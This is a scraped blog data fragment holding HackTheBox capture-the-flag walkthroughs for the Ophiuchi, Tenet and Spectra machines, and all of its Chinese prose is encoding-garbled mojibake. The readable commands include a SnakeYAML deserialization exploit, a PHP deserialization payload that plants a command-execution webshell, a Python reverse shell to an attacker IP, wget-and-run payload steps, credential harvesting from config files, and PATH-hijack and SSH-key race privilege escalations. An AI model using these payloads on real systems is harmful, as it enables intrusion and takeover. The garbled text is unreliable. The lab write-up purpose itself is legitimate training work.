å…·æœ‰æ–‡ä»¶åçš„å­ç›®å½• javax.script.ScriptEngineFactoryï¼Œåœ¨è¯¥æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å°†è°ƒç”¨æˆ‘ä»¬çš„exploit åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œexploit.java å¯ä»¥ä»è¿™é‡Œè·å–javaä»£ç ï¼Œç„¶åæˆ‘ä»¬å°†å°è¯•pingæˆ‘ä»¬çš„æœ¬åœ°æœºå™¨ä»¥æŸ¥çœ‹exploitæ˜¯å¦æœ‰æ•ˆï¼Œä»¥ä¾¿æˆ‘ä»¬è·å¾—åå‘shell https://github.com/LucifielHack/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java å°†è¯¥ä»£ç ä¿å­˜ä¸ºexploit.java ç„¶åä½¿ç”¨javacè¿›è¡Œç¼–è¯‘ï¼Œå³å¯å¾—åˆ°.classæ–‡ä»¶ æˆ‘ä»¬å°†snakeyaml.exploitå†™å…¥åˆ°javax.script.ScriptEngineFactoryä¸­ ç„¶åæˆ‘ä»¬æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ snakeyamlï¼Œç„¶åå°†æ–‡ä»¶ç»“æ„è¿™æ ·æ”¾ ç„¶åæˆ‘ä»¬åœ¨Ophiuchiç›®å½•ä¸‹ä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡å™¨ ç„¶ååœ¨YAMLä¸­å±äºæˆ‘ä»¬ç¬¬ä¸€æ¬¡è°ƒç”¨çš„pocæ¥è¿›è¡Œè°ƒç”¨ æˆåŠŸ ç„¶åæˆ‘ä»¬åœ¨Ophiuchiç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªexploit.shè„šæœ¬ è¿™ä¸ªè„šæœ¬æ˜¯ç”¨æ¥åå¼¹shellç”¨çš„ ç„¶åæˆ‘ä»¬æœ¬åœ°ä½¿ç”¨ncå¼€å¯ä¸€ä¸ªç›‘å¬ç«¯å£ nc -nvlp 4444 ç„¶åï¼Œæˆ‘ä»¬å°†wgetå°†åˆšæ‰å†™çš„bashè„šæœ¬ä¸‹è½½å¹¶ä¿å­˜åˆ°&#x2F;tmpç›®å½•ä¸­ï¼Œç„¶åä½¿ç”¨bashæ‰§è¡Œå®ƒï¼Œç°åœ¨æˆ‘ä»¬ä¼‘è¦ä¿®æ”¹æˆ‘ä»¬çš„exploit.javaæ–‡ä»¶ ç„¶åé‡æ–°ç¼–è¯‘exploit.javaæ–‡ä»¶ åœ¨YAMLä¸­ç»§ç»­æ‰§è¡Œæˆ‘ä»¬åˆšæ‰çš„ä»£ç  æˆåŠŸè·å–åˆ°shellï¼Œå¹¶ä¸”ä½¿ç”¨python3è·å¾—ä¸€ä¸ªç¨³å®šçš„shell python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;; PSï¼šå¦‚æœè¿™é‡Œæ²¡æœ‰è·å–åˆ°ï¼Œé‚£åº”è¯¥æ˜¯javaçš„ç‰ˆæœ¬ä¸å¯¹ï¼Œæ–°ç‰ˆæœ¬javaä¸è¡Œï¼Œå¿…é¡»å¾—ä½¿ç”¨java class 55ç‰ˆæœ¬è¿›è¡Œç¼–è¯‘ ä»£ç  javac â€“release 11 exploit.java ç„¶åæˆ‘ä»¬æˆ‘ä»¬çŸ¥é“ï¼Œè¯¥webæœåŠ¡å™¨æ˜¯ä½¿ç”¨apache tomcatè¿›è¡Œæ­å»ºè¿è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨å»æŸ¥çœ‹tomcatçš„é…ç½®æ–‡ä»¶ ä½¿ç”¨findå‘½ä»¤è¿›è¡ŒæŸ¥æ‰¾ find / -name &quot;tomcat-users.xml&quot; 2&gt;/dev/null æ‰¾åˆ°äº†ï¼Œç„¶åä½¿ç”¨catæŸ¥çœ‹å³å¯ å¾—åˆ°äº†è´¦å·å¯†ç  username = admin password = whythereisalimit æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹è¿™å°æœºå™¨çš„è´¦æˆ· æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™å°linuxçš„æœºå™¨ä¸Šï¼Œadminå±…ç„¶æ˜¯ä¸€ä¸ªè´¦æˆ·ï¼Œè€Œä¸”æƒé™è¿˜ä¸ä½ï¼Ÿå‡ºé¢˜äººæ‰£ååˆ† è®°å¤§è¿‡ä¸€æ¬¡ å’±ä»¬ç›´æ¥ä½¿ç”¨suè¿›è¡Œç™»å½•æˆ–ä½¿ç”¨sshè¿›è¡Œç™»å½•å³å¯ æˆåŠŸæ‹¿åˆ°useræƒé™çš„flag æƒé™æå‡ä½¿ç”¨sudo -læŸ¥çœ‹å’±ä»¬çš„sudoæƒé™ å’±ä»¬å‘ç°ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨rootæƒé™æ‰§è¡Œ&#x2F;opt&#x2F;wasm-functions&#x2F;index.goæ–‡ä»¶ï¼Œé‚£ææƒçš„çªç ´å£è‚¯å®šåœ¨è¿™äº†ï¼Œå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹å§ è¿›è¡Œä»£ç å®¡è®¡ï¼Œå’±ä»¬å¯ä»¥çœ‹åˆ°ã€‚å®ƒä¼šè¯»å–Webç¨‹åºé›†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åå®ƒä¼šä»infoå‡½æ•°ä¸­è·å–ä¸€ä¸ªå€¼ï¼Œå¦‚æœè¯¥å€¼ä¸ç­‰äº1ï¼Œç¨‹åºå°†ä¼šè¾“å‡ºâ€œNot ready to deployâ€ï¼Œä¸ç„¶å°†ä¼šæ‰§è¡Œä¸€ä¸ªdeploy.shè„šæœ¬ æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼Œ main.wasm å’Œ deploy.sh åœ¨æºä»£ç ä¸­æ²¡æœ‰ç»å¯¹è·¯å¾„ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åˆ›å»ºè‡ªå·±çš„æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨ PATH å˜é‡ã€‚ æ‰€ä»¥é¦–å…ˆæˆ‘è¦ä¸‹è½½ main.wasm åˆ°æˆ‘çš„æœºå™¨ä¸Š åœ¨ç›®æ ‡æœºå™¨ç›®å½•&#x2F;opt&#x2F;wasm-functionsç›®å½•ä¸­ä½¿ç”¨Python3å¼€å¯ä¸€ä¸ªæœåŠ¡å™¨ ç„¶åä½¿ç”¨wgetä¸‹è½½ https://github.com/LucifielHack/wabt è¿™é‡Œä½¿ç”¨ä¸€ä¸ªåä¸ºwabt(Web Assembly Binary Toolkit)çš„å·¥å…·ï¼Œæˆ‘ä»¬éœ€è¦å°†main.wasmæ–‡ä»¶è½¬æ¢ä¸º.watæ–‡ä»¶ï¼Œå› ä¸ºå®ƒæ˜¯è¯¥äºŒè¿›åˆ¶æ–‡ä»¶çš„æ–‡æœ¬æ ¼å¼ã€‚ä½†åœ¨æ­¤ä¹‹å‰é¦–å…ˆè®©æˆ‘ä»¬ä½¿ç”¨wasm-decompileæŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„infoå‡½æ•°ï¼Œå®ƒå°†äºŒè¿›åˆ¶æ–‡ä»¶åç¼–è¯‘ä¸ºCè¯­è¨€çš„æ ¼å¼ ./wabt/build/wasm-decompile main.wasm -o main.dcmp æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¥infoå‡½æ•°è¿”å›å€¼0ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬è¦ä¿®æ”¹çš„å†…å®¹äº† å°†.wasmè½¬æ¢ä¸º.watæ–‡ä»¶ ./wabt/build/wasm2wat main.wasm -o main.wat ç„¶åæ‰“å¼€main.watæ–‡ä»¶ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°constå€¼ä¸º0 æˆ‘ä»¬å°†å®ƒæ”¹ä¸º1 ç°åœ¨æˆ‘ä»¬éœ€è¦ä¿®æ”¹å›äºŒè¿›åˆ¶å½¢å¼(.wasm) å› æ­¤æˆ‘ä»¬éœ€è¦å°†.watè½¬æ¢ä¸º.wasm ./wabt/build/wat2wasm main.wat -o main.wasm å°†main.wasmä¸Šä¼ åˆ°&#x2F;tmpç›®å½• å’±ä»¬åˆ¶ä½œä¸€ä¸ªdeploy.shæ–‡ä»¶åœ¨&#x2F;tmpç›®å½• ç°åœ¨æ·»åŠ &#x2F;tmpåˆ°PATHå˜é‡å¹¶ä»¥sudoçš„å½¢å¼è¿è¡Œgolangæºä»£ç  export PATH=/tmp:$PATH echo $PATH å¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œå·²ç»è¿è¡ŒæˆåŠŸäº†ï¼Œç›´æ¥ä½¿ç”¨bash -pè¿›è¡Œææƒå³å¯ ææƒæˆåŠŸ æˆåŠŸè·å¾—rootæƒé™çš„flag æ”¶å·¥ç¡è§‰","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Tenet - Hackthebox","slug":"Hackthebox - Tenet","date":"2021-05-31T11:38:36.000Z","updated":"2023-05-20T03:16:15.000Z","comments":true,"path":"2021/05/31/Hackthebox - Tenet/","link":"","permalink":"http://www.lucifiel.com/2021/05/31/Hackthebox%20-%20Tenet/","excerpt":"","text":"Hackthebox - TenetHackthebox - Tenet é¶åœºå®æˆ˜ é¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›† é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ nmap -A -sS -sC -sV 10.10.10.223 æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæœ¬å°é¶åœºå¼€å¯äº†22å’Œ80ç«¯å£ï¼Œå’±ä»¬è®¿é—®80ç«¯å£çœ‹çœ‹ è®¿é—®80ç«¯å£åå‘ç°æ˜¯ä¸€ä¸ªapache2çš„é»˜è®¤é¡µé¢ï¼Œé‚£å°±å¯ä»¥ç¡®å®šæ˜¯apacheçš„æ¼æ´å…¥æ‰‹äº† ç®€å•æŸ¥çœ‹äº†ä¸€ä¸‹ï¼Œæ²¡æœ‰å…¶ä»–å•¥ä¸œè¥¿ï¼Œå’±ä»¬å…ˆçˆ†ä¸ªç›®å½•å§ æ‡’å¾—ä½¿ç”¨é¼ æ ‡äº†ï¼Œæ‰€ä»¥è¿™é‡Œå’±ä»¬ä½¿ç”¨gobusterè¿›è¡Œçˆ†ç ´ gobuster dir -u http://10.10.10.223 -x php,log,txt -w &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt â€“wildcard -o gob æ‰¾åˆ°äº†ä¸€ä¸ªæ–‡ä»¶ä¸€ä¸ªç›®å½• &#x2F;users.txt &#x2F;wordpress å’±ä»¬å…ˆçœ‹çœ‹&#x2F;users.txtæ–‡ä»¶ å¾—åˆ°äº†ä¸€ä¸ªç”¨æˆ·åSuccessï¼Œå…ˆè®°å½•ä¸‹æ¥ï¼Œå’±ä»¬å»çœ‹çœ‹wp å˜›ç©æ„å„¿ï¼Ÿä½ å‘Šæˆ‘è¿™æ˜¯wordpressï¼Ÿæˆ‘éƒ½å‡†å¤‡å¥½ç ¸expäº†ç»“æœä½ å‘Šè¯‰æˆ‘è¿™ï¼Ÿ ç¿»äº†ä¸€ä¸‹ç½‘é¡µæºä»£ç ï¼Œåœ¨cssé‡Œå‘ç°äº†ä¸€ä¸ªåŸŸåtenet.htbï¼Œæˆå§ï¼Œè¿˜æ˜¯å¾—å»&#x2F;etc&#x2F;hostsé‡Œæ·»åŠ ä¸€ä¸ªè§£æã€‚ vim &#x2F;etc&#x2F;hosts æ·»åŠ åå†è®¿é—®å°±å¯¹åŠ²äº† è¿™é‡Œå‘ç°æœ‰ä¸€äº›æ–‡ç« ï¼Œä½†æ˜¯æˆ‘è¿™å°å­¦è‹±è¯­éƒ½ä¸åŠæ ¼çš„æ°´å¹³â€¦æ²¡åŠæ³•ï¼Œå¼€ç¿»è¯‘å™¨å§ ç„¶åæˆ‘ä»¬åœ¨å…¶ä¸­ä¸€ç¯‡ã€ŠMigrationã€‹ä¸Šï¼Œæ‰¾åˆ°äº†ä¸€æ¡è¯„è®º ç»è¿‡æœºç¿»+æˆ‘ä¸ªäººçš„ç†è§£åï¼Œå¤§è‡´æ„æ€å¦‚ä¸‹ï¼š ä½ æ˜¯å¦åˆ é™¤äº†sator.phpçš„å¤‡ä»½æ–‡ä»¶ï¼Ÿè¿ç§»æ–‡ä»¶ä¸å®Œæ•´ï¼Œä½ ä¸ºå•¥è¦è¿™æ ·åšï¼Ÿä½ å›¾å•¥ï¼Ÿï¼ˆæœ€åä¸€å¥æˆ‘è‡ªå·±åŠ çš„ï¼Œæ–‡é‡Œæ²¡æœ‰ï¼‰ æ•´ç†ä¸€ä¸‹ç›®å‰æˆ‘ä»¬å¾—åˆ°çš„ä¿¡æ¯ ä¸¤ä¸ªç”¨æˆ·ï¼Œåˆ†åˆ«ä¸ºneilå’Œç®¡ç†å‘˜protagonistï¼ˆçŒœæµ‹ï¼Œè¯æ®å¦‚ä¸‹å›¾ï¼‰ å’Œä¸€ä¸ªphpæ–‡ä»¶ sator.php æ€è·¯æ•´ç†ï¼Œç”¨æˆ·neilè´¨é—®ç®¡ç†å‘˜ä¸ºä»€ä¹ˆåœ¨è¿ç§»webç¨‹åºçš„æ—¶å€™åˆ é™¤äº†sator.phpä»è€Œå¯¼è‡´äº†ç½‘ç«™æ–‡ä»¶ä¸å®Œæ•´ï¼Œä¹Ÿå°±æ˜¯è¯´wordpressç›®å½•ä¸‹æ˜¯ä¸å¯èƒ½å­˜åœ¨è¿™ä¸ªæ–‡ä»¶çš„ã€‚ä½†æ˜¯å’±ä»¬åˆè¦åˆ©ç”¨åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œé‚£åœ¨ä¸€å¼€å§‹çš„apache2ç›®å½•ä¸‹å°è¯•ä¸€ä¸‹ï¼Ÿ ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œæˆ‘åˆå›å»çœ‹äº†ä¸€ä¸‹neilç”¨æˆ·çš„è¯„è®ºã€‚ ç­‰ç­‰ï¼Ÿå¤‡ä»½æ–‡ä»¶ï¼Ÿé‚£æ„æ€å°±æ˜¯bakæ–‡ä»¶ï¼Ÿå’±ä»¬å°è¯•ä¸€ä¸‹ æˆ‘å¯çœŸæ˜¯å¤ªæ£’äº†ï¼Œç°åœ¨æ˜¯å‡Œæ™¨å››ç‚¹ï¼Œå¥–åŠ±è‡ªå·±ä¸€é¡¿çƒ§çƒ¤ï¼Œé•¿èƒ–äº†éƒ½æ˜¯ä½ ä»¬çš„è´£ä»»ï¼Œè®°å¾—èƒŒé”… æˆåŠŸæåˆ°ä¸€ä»½phpæºç ï¼Œå®¡è®¡å§ã€‚ ä½†æ˜¯å§ï¼Œå®¡è®¡ç¡®å®æ˜¯æˆ‘çš„çŸ­æ¿ï¼Œæ‰€ä»¥æ€ä¹ˆåŠå‘¢ï¼Ÿè¿™ä¸ªæ—¶å€™ä¸¢ç»™â€œæœ‹å‹â€å°±å¥½äº†ï¼Œè€ç™½å«–äº† åŸç†è®²è§£ æˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œçœ‹åˆ°ï¼Œæœ‰ä¸€ä¸ªç±» DatabaseExportï¼Œå…¶ä¸­æœ‰ä¸¤ä¸ªå…¬å…±å˜é‡ user_fileã€data å¹¶ä¸”åœ¨è¿™ä¸ªç±»ä¸­ï¼Œæœ‰ä¸€ä¸ªå…¬å…±å‡½æ•°è¢«è°ƒç”¨ update_db()ï¼Œè¯¥å‡½æ•°å°† data å˜é‡è®¾ç½®ä¸ºâ€œSuccessâ€ï¼Œè¿™åªæ˜¯ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œæ­£å¦‚ä½ ä» sator.php ä¸­çœ‹åˆ°çš„é‚£æ ·ï¼Œæœ€åçš„ç½‘ç»œæµè§ˆå™¨æœ‰ä¸€ä¸ªmagicå‡½æ•°ï¼ˆè¿™ä¸ªæ‰¾èµ„æ–™çš„æ—¶å€™çœ‹åˆ°çš„ï¼Œä½†æˆ‘ä¸çŸ¥é“æ€ä¹ˆç¿»è¯‘ï¼‰__destruct()ï¼Œå½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨è°ƒç”¨ user_file å°†ä½¿ç”¨æ¥è‡ª data çš„å†…å®¹å¹¶å°†å…¶æ”¾å…¥webç›®å½•ä¸­ï¼Œè¿™æ„å‘³ç€åœ¨webç›®å½•ä¸­åˆ›å»º users.txt æ•°æ®â€œSuccessâ€ã€‚ æœ€åæˆ‘ä»¬å¯ä»¥ GET å‚æ•° arepoï¼Œç°åœ¨è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ¼æ´ï¼Œç§°ä¸ºâ€œPHPååºåˆ—åŒ–â€ å› æ­¤ï¼Œè¦åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¿…é¡»ä¿®æ”¹åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç±»å˜é‡ user_fileï¼Œå¹¶å°† data åºåˆ—åŒ–ï¼Œä¸€æ—¦æˆ‘ä»¬å¾—åˆ°äº†åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬æŠŠå®ƒä¼ é€’ç»™ arepo å‚æ•°ä¸­ã€‚ æ¼æ´åˆ©ç”¨ è™½ç„¶æˆ‘ä»£ç å®¡è®¡å¾ˆå¼±ï¼Œä½†æˆ‘å¤§æ¦‚çœ‹æ‡‚äº†ï¼Œå®ƒç”Ÿæˆäº†ä¸€ä¸ªåä¸ºusers.txtçš„æ–‡ä»¶ï¼Œå†…å®¹ä¸ºSuccessï¼Œé‚£å’±ä»¬è®©ä»–ç”Ÿæˆphpæ–‡ä»¶ç„¶åå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œè¿™ä¸å°±æˆäº†ï¼Ÿ è¿™ä¸å°±æ˜¯å¦¥å¦¥çš„phpååºåˆ—åŒ–å—ï¼Ÿ ä»£ç  â€˜; } $test &#x3D; serialize(new DatabaseExport); echo $test; ?&gt; å°†ä¸Šé¢çš„ä»£ç ä¿å­˜ä¸ºphpæ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œåä¼šå¾—åˆ°ä¸€ä¸ªphpåºåˆ—åŒ– ç„¶åæˆ‘ä»¬éœ€è¦ä»¥urlç¼–ç çš„å½¢å¼æŠŠå®ƒä¼ é€’ç»™ GET å‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨cyberchefï¼ˆæˆ–å…¶ä»–å·¥å…·ï¼‰æ¥å®Œæˆ https://gchq.github.io/CyberChef/#recipe=URL_Encode(false) O:14:%22DatabaseExport%22:2:%7Bs:9:%22user_file%22;s:9:%22shell.php%22;s:4:%22data%22;s:29:%22%3C?php%20system($_GET%5B%22cmd%22%5D);?%3E%22;%7D å’±ä»¬é€šè¿‡ GET ä¼ è¾“ï¼Œç›´æ¥ç²˜è´´åˆ°urlé‡Œ http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:%7Bs:9:%22user_file%22;s:9:%22shell.php%22;s:4:%22data%22;s:29:%22%3C?php%20system($_GET%5B%22cmd%22%5D);?%3E%22;%7D æç¤ºå·²ç»æ›´æ–°äº†ï¼Œé‚£å°±æ˜¯æˆåŠŸäº† æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œæˆ‘ä»¬æ‹¿åˆ°äº†ä¸€ä¸ªwebshell ç†Ÿæ‚‰æˆ‘çš„è¯»è€…ä»¬éƒ½çŸ¥é“ï¼Œæˆ‘æ¯”è¾ƒå–œæ¬¢åˆ©ç”¨python3 æ‰€ä»¥å’±ä»¬ç›´æ¥çœ‹çœ‹æ˜¯å¦å­˜åœ¨python3 å“¦è± å­˜åœ¨python3ï¼Œè¿™æ˜¯ä¸€ä»¶å¾ˆå¹¸è¿çš„äº‹æƒ… å’±ä»¬ç›´æ¥ç”¨python3è¿›è¡Œåå¼¹shell æœ¬åœ°ç›‘å¬4444ç«¯å£ http://10.10.10.223/shell.php?cmd=python3 -c â€˜import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((â€œ10.10.14.184â€,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(â€œ&#x2F;bin&#x2F;bashâ€)â€™ æˆåŠŸå¾—åˆ°äº†ä¸€ä¸ªç¨³å®šçš„shellï¼ŒèŠœæ¹–ï¼Œèµ·é£ ç”±äºæˆ‘ä»¬ç°åœ¨åªæ˜¯www-dataç”¨æˆ·ï¼Œæƒé™ä½çš„å¾ˆï¼Œç°åœ¨è¿˜å¾—å…ˆè·å–åˆ°ä¸€ä¸ªæ­£å¸¸çš„ç”¨æˆ· å’±ä»¬æ£€æŸ¥ä¸€ä¸‹cronçš„å·¥ä½œ æ£€æŸ¥ä¸€ä¸‹å¼€æ”¾çš„ç«¯å£ å·²ç»æœ‰æ€è·¯äº†å•Šå…„å¼Ÿä»¬ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°3306ç«¯å£åœ¨æˆ‘ä»¬æœ¬åœ°è¿è¡Œç€ï¼Œé‚£å¤šåŠå°±æ˜¯mysqläº†ï¼Œå’±ä»¬ç›´æ¥æ‰¾mysqlçš„é…ç½®æ–‡ä»¶å•Š æˆ‘è®°å¾—æˆ‘ä»¥å‰æ‰“è¿‡å¾ˆå¤šwordpressçš„ç«™ï¼ˆæŠ±æ­‰ï¼Œéƒ½æ˜¯æ¶‰å¯†é¡¹ç›®ï¼Œæ‰€ä»¥ä¸æ–¹ä¾¿å†™æˆæ–‡ç« ï¼‰ï¼Œåœ¨wp-config.phpæ–‡ä»¶é‡Œï¼Œä¸€èˆ¬ä¼šæœ‰æ•°æ®åº“çš„è´¦å·å¯†ç çš„ï¼Œå’±ä»¬å»è¯»å–è¯•è¯• æˆåŠŸæ‹¿åˆ° DB_NAME &#x3D; wordprss DB_USER &#x3D; neil DB_PASSWORD &#x3D; Opera2112 ç™»é™†å¤±è´¥ï¼Ÿé‚£è¿™æš—ç¤ºå°±å¾ˆæ˜æ˜¾äº†ï¼Œåº”è¯¥æ˜¯ä¸€ä¸ªç”¨æˆ·äº†ï¼Œå’±ä»¬çœ‹çœ‹å»ï¼Œ ç­‰ä¼šå„¿ï¼Ÿæˆ‘ä»¥ä¸ºè¿™æ˜¯ä¸€ä¸ªæ•°æ®åº“ç”¨æˆ·ï¼Œæ²¡æƒ³åˆ°æƒé™è¿˜æŒºå¤§ï¼Ÿ å’±ä»¬ç›´æ¥ç™»å½•å§ ç™»å½•æˆåŠŸ æˆåŠŸæ‹¿åˆ°useræƒé™çš„flag æƒé™æå‡ å’±ä»¬è€è§„çŸ©ï¼Œsudo -læŸ¥çœ‹ä¸€ä¸‹sudoæƒé™ å‘ç°å¯ä»¥ç›´æ¥ç”¨rootæƒé™æ‰§è¡ŒenableSSH.shæ–‡ä»¶ï¼Œé‚£ææƒè¿˜ä¸ç®€å•ï¼Ÿåœ¨æ ¹ç›®å½•ä¸‹æœ¬æ¥å°±å­˜åœ¨ä¸€ä¸ªexp.shï¼Œè¿™ä¸æç¤ºå°±æ¥äº†ï¼Ÿå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹ æˆ‘æ€ä¹ˆçœ‹ç€æœ‰ç‚¹ä¸å¯¹åŠ²å‘¢ã€‚ã€‚ã€‚ åœ¨è¿Ÿç–‘äº†å¤§æ¦‚1.25ç§’åï¼Œæˆ‘æ‚Ÿäº†ï¼ è¿™TMæ˜¯å…¶ä»–å“¥ä»¬å„¿åšè¿‡åç•™ä¸‹çš„ææƒè„šæœ¬ï¼è¿™æ ¹æœ¬å°±ä¸æ˜¯æˆ‘è¦çš„ä¸œè¥¿ï¼ æˆ‘ä¸¢å•Šï¼Œç¨ç­‰å„ä½ï¼Œæˆ‘å…ˆé‡ç½®ä¸€ä¸‹é¶åœºï¼Œå†æ¥ä¸€æ¬¡ cat &#x2F;usr&#x2F;local&#x2F;bin&#x2F;enableSSH.sh æŸ¥çœ‹è¿™ä¸ªshæ–‡ä»¶æ‰å¯¹ï¼Œåˆšæ‰æé”™äº†ï¼Œè¯·å¤§å®¶æ— è§†å“ˆ è¿™äº›å†…å®¹éƒ½æ¯”è¾ƒæ— èŠï¼Œå’±ä»¬ç›´æ¥æ‹‰åˆ°æœ€åº•ä¸‹ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªaddkey()ä½¿ç”¨å‘½ä»¤åˆ›å»ºä¸´æ—¶æ–‡ä»¶çš„å‡½æ•°mktemp å¦‚æœæˆ‘ä»¬åœ¨æœ¬åœ°æœºå™¨ä¸Šè¿è¡Œæ­¤å‘½ä»¤æŸ¥çœ‹å®ƒç”Ÿæˆçš„æ–‡ä»¶åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ¯æ¬¡è¿è¡Œæ­¤å‘½ä»¤æ—¶ï¼Œæ–‡ä»¶åéƒ½æ˜¯ä¸ä¸€æ ·çš„ mktemp -u &#x2F;temp&#x2F;ssh-XXXXXX æ‘¸äº†æ‘¸æˆ‘å¹¶ä¸å­˜åœ¨çš„å¤´å‘ï¼Œè¿™ç©æ„å„¿çœŸè®©äººå¤´ç§ƒ å…¬å…±å¯†é’¥è·å–æ–¹æ³• ssh-keygen ç„¶åæ ¹æ®æˆ‘ä»¬è‡ªå·±çš„æƒ…å†µè¿›è¡Œè®¾ç½®ï¼Œç„¶åæ–‡ä»¶ä¿å­˜åœ¨&#x2F;root&#x2F;.ssh&#x2F;id-rsa.pubä¸­ å°†å¦‚ä¸‹ä»£ç ä¿å­˜åˆ°exp.shæ–‡ä»¶ while true do echo â€˜ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDoVUNa8uk2pi8tECc1c6SsFbq1xlNvnhwzqgEjmN6yyp8u7TIC4VbzgyRC2UnN9dM0wn9mP103gIAxLGXxgy5kl+cquFffZPoOjfd9I4ZLFDHaPr6eXbXSCg445UXG1gAj8b7lPGemz6vApGrlMGjl1TABKMBHCTbzqSVoAxaDZXSiF4kIKKU4b2Dx8Uw7XgTdd+KWZnuIozuYyZlD3+cl&#x2F;&#x2F;inLetupgpP0ZBvcBqAr1UqtCxsMx2Yzy3XfQ&#x2F;VQMW4Qeswuvx98P+kP6wqpq2jXxaEoRkyVcIlQekJg1W+XwuuNixQeli7CQQBgqu7FwUYrftlWZm0br3HNQlVwBgB+zqExOmt8iktcHjw3pLetwI7X7sdB5pUS4QN2hwDDQsAuhaGMt4MAWSLKsgEZJxWT4FTH2R5+eTCXZNbH97aGbH0&#x2F;ONmzZFKm9bOwvnflQ5taIe149JbuPMc6sba5C4FROHagprucjaPDYhp&#x2F;v0q0ztKq2G9Ay5yfCTTFj5sYuk&#x3D; root@rootâ€™ |tee &#x2F;tmp&#x2F;ssh-* done æ·»åŠ è¿è¡Œæƒé™ chmod +x exp.sh ç„¶åè¿è¡Œ.&#x2F;exp.sh ç„¶åå’±ä»¬å†å¼€ä¸€ä¸ªsshè¿æ¥ ç„¶åå’±ä»¬åœ¨æ–°å¼€çš„sshè¿æ¥ä¸Šè¿è¡Œâ€™ sudo &#x2F;usr&#x2F;local&#x2F;bin&#x2F;enableSSH.shâ€™å‡ æ¬¡ ç„¶åå’±ä»¬æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å¯ä»¥è¿æ¥ ssh root@10.10.10.223 -i id_rsa å¦‚æœä¸è¡Œï¼Œå’±ä»¬å°±å†æ¥ä¸€æ¬¡å³å¯ æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag æ­£å¥½è¿™ä¸ªæ—¶å€™æˆ‘ç‚¹çš„çƒ§çƒ¤ä¹Ÿåˆ°äº†ï¼Œåƒå¤œå®µå»","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Spectra - Hackthebox","slug":"Hackthebox - Spectra","date":"2021-05-28T11:38:36.000Z","updated":"2023-05-20T03:10:26.000Z","comments":true,"path":"2021/05/28/Hackthebox - Spectra/","link":"","permalink":"http://www.lucifiel.com/2021/05/28/Hackthebox%20-%20Spectra/","excerpt":"","text":"Hackthebox - Spectraé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›† ä½¿ç”¨nmapè¿›è¡ŒåŸºæœ¬çš„ç«¯å£æ‰«æ nmap â€“A -sS -sC -sV 10.10.10.229 æˆ‘ä»¬å‘ç°å¼€å¯äº†22ã€80å’Œ3306ç«¯å£ å’±ä»¬è®¿é—®80ç«¯å£çœ‹ä¸€ä¸‹ å†…å®¹éå¸¸ç®€å•ï¼Œå’±ä»¬çœ‹ä¸€ä¸‹æºä»£ç  å‘ç°ä¼šè·³è½¬åˆ°åŸŸåspectra.htb å’±ä»¬åœ¨hostsé‡Œæ·»åŠ è¯¥åŸŸå vim &#x2F;etc&#x2F;hosts 10.10.10.229 spectra.htb www.spectra.htb ç„¶åå’±ä»¬è®¿é—®ä¸€ä¸‹è¯•è¯• å’±ä»¬å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªwordpressçš„ç«™ç‚¹ 